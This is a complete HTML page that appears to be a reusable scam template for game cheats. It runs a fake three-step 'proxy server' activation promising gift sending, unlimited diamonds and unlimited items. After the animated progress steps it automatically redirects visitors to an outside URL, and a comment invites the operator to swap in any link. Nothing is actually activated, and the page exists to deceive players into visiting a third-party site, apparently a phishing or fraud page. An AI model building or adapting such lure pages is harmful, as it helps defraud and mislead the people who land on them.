<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Activate Proxy Server</title>

<style>
* {
  box-sizing: border-box;
}

body {
  margin: 0;
  min-height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
  padding: 25px 15px;
  font-family: Arial, sans-serif;
  color: white;
  background: radial-gradient(circle at center, #123b25, #020806 75%);
}

body::before {
  content: "";
  position: fixed;
  inset: 0;
  pointer-events: none;
  opacity: .18;
  background-image:
    linear-gradient(#00ff7720 1px, transparent 1px),
    linear-gradient(90deg, #00ff7720 1px, transparent 1px);
  background-size: 30px 30px;
}

.container {
  width: 100%;
  max-width: 430px;
  text-align: center;
  padding: 28px 20px;
  border: 1px solid #00ff77;
  border-radius: 20px;
  background: rgba(3,15,10,.94);
  box-shadow: 0 0 30px #00ff7730;
  position: relative;
}

.profile {
  width: 155px;
  height: 155px;
  object-fit: cover;
  border-radius: 18px;
  border: 2px solid #00ff77;
  box-shadow: 0 0 20px #00ff77;
  margin-bottom: 20px;
}

h1 {
  font-size: 25px;
  color: #ff3030;
  margin: 0 0 25px;
  text-shadow: 0 0 12px #ff303080;
  letter-spacing: 1px;
}

.option {
  display: flex;
  align-items: center;
  gap: 13px;
  padding: 15px 12px;
  margin: 12px 0;
  border-radius: 12px;
  background: #0a1c12;
  border: 1px solid #245237;
  text-align: left;
  transition: .4s;
}

.circle {
  width: 25px;
  height: 25px;
  flex-shrink: 0;
  border: 2px solid #668574;
  border-radius: 50%;
  display: grid;
  place-items: center;
  transition: .3s;
}

.option span:last-child {
  font-size: 13px;
  font-weight: bold;
  color: #d5eadb;
  letter-spacing: .4px;
}

.option.loading {
  border-color: #00d96b;
}

.option.loading .circle {
  border: 3px solid #244b32;
  border-top-color: #00ff77;
  animation: spin .7s linear infinite;
}

.option.active {
  border-color: #00ff77;
  box-shadow: 0 0 15px #00ff7730;
}

.option.active .circle {
  background: #00e66b;
  border-color: #00e66b;
  color: #003b1a;
  animation: pop .3s ease;
}

.option.active .circle::after {
  content: "✓";
  font-size: 16px;
  font-weight: bold;
}

.option.active span:last-child {
  color: #00ff77;
}

@keyframes spin {
  to { transform: rotate(360deg); }
}

@keyframes pop {
  0% { transform: scale(.5); }
  100% { transform: scale(1); }
}

.progress {
  height: 5px;
  background: #173321;
  border-radius: 10px;
  margin-top: 20px;
  overflow: hidden;
}

.bar {
  width: 0%;
  height: 100%;
  background: #00ff77;
  transition: width .5s;
}

#message {
  color: #8bb99c;
  font-size: 12px;
  margin-top: 15px;
}
</style>
</head>

<body>

<div class="container">

<img class="profile"
src="https://www.image2url.com/r2/default/images/1787584630957-2a2f9988-cb5a-4eac-9e31-12e52329c4a7.jpg"
alt="Profile Image">

<h1>ACTIVATE PROXY SERVER</h1>

<div class="option" id="step1">
  <div class="circle"></div>
  <span>GIFT SEND ACTIVATE</span>
</div>

<div class="option" id="step2">
  <div class="circle"></div>
  <span>UNLIMITED DIAMOND ACTIVATE</span>
</div>

<div class="option" id="step3">
  <div class="circle"></div>
  <span>UNLIMITED ITEM ACTIVATE</span>
</div>

<div class="progress">
  <div class="bar" id="bar"></div>
</div>

<p id="message">PLEASE WAIT...</p>

</div>

<script>

/* ==================================
   YOUR LINK HERE
   Change this URL whenever you want
================================== */

const YOUR_LINK = "https://k.zodd.top/proxypyare.html";

/* ================================== */

let current = 0;

const steps = ["step1", "step2", "step3"];

function activateNext() {

  if (current >= 3) {
    window.location.replace(YOUR_LINK);
    return;
  }

  const item = document.getElementById(steps[current]);

  item.classList.add("loading");

  document.getElementById("message").innerText =
    "ACTIVATING... PLEASE WAIT";

  setTimeout(() => {

    item.classList.remove("loading");
    item.classList.add("active");

    current++;

    document.getElementById("bar").style.width =
      (current / 3 * 100) + "%";

    activateNext();

  }, 2000);
}

setTimeout(activateNext, 500);

</script>

</body>
</html>
